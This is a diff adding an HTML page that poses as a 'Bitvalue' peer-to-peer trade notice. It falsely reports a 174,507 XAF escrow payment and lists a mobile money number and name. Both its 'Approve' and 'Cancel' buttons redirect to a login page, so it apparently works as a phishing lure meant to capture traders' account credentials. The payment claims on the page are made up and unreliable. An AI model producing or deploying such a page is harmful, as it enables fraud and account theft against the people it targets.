@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bitvalue — P2P Trade Reminder</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+
+  <main class="card">
+
+    <div class="brand">Bitvalue</div>
+
+    <div class="subtitle">
+      P2P Trade Reminder
+    </div>
+
+    <!-- Success message -->
+    <section class="success-box">
+      <div class="success-icon">✓</div>
+
+      <div>
+        <div class="success-title">
+          Payment Initiated — Success
+        </div>
+
+        <div class="success-text">
+          Your payment has been made via Escrow
+          Agent. Please log in to verify or cancel.
+        </div>
+      </div>
+    </section>
+
+    <div class="description">
+      Buyer has made payment for the active P2P Deriv
+      trade <strong>Accept payment</strong> or
+      <strong>Reject Payment</strong> if needed.
+    </div>
+
+    <!-- Transaction information -->
+    <section class="details">
+
+      <div class="row">
+        <div class="label">Payment method</div>
+
+        <div class="value">
+          Mobile Money-<br>
+          671764393 Fomugang<br>
+          Fan
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="label">Trade ID</div>
+
+        <div class="value">
+          TR-871129
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="label">Amount</div>
+
+        <div class="value amount">
+          174,507.00 XAF
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="label">Status</div>
+
+        <div class="value">
+          <span class="status">
+            <span class="clock">◷</span>
+            Waiting Confirmation
+          </span>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- Warning -->
+    <section class="warning">
+      <div class="warning-icon">⚠</div>
+
+      <div class="warning-text">
+        All payments are made from Bitvalue
+        Headquarters in Costa Rica. Always make
+        sure to check location before confirming
+        on code.
+      </div>
+    </section>
+
+    <!-- Actions -->
+    <button
+      type="button"
+      class="button approve"
+      onclick="window.location.href='login.html'"
+    >
+      <span class="check">✓</span>
+      Approve transactions
+    </button>
+
+    <button
+      type="button"
+      class="button cancel"
+      onclick="window.location.href='login.html'"
+    >
+      <span class="x">×</span>
+      Cancel transaction
+    </button>
+
+    <div class="footer">
+      Both actions require you to sign in. You will be redirected to
+      the login page.
+    </div>
+
+  </main>
+
+</body>
+</html>
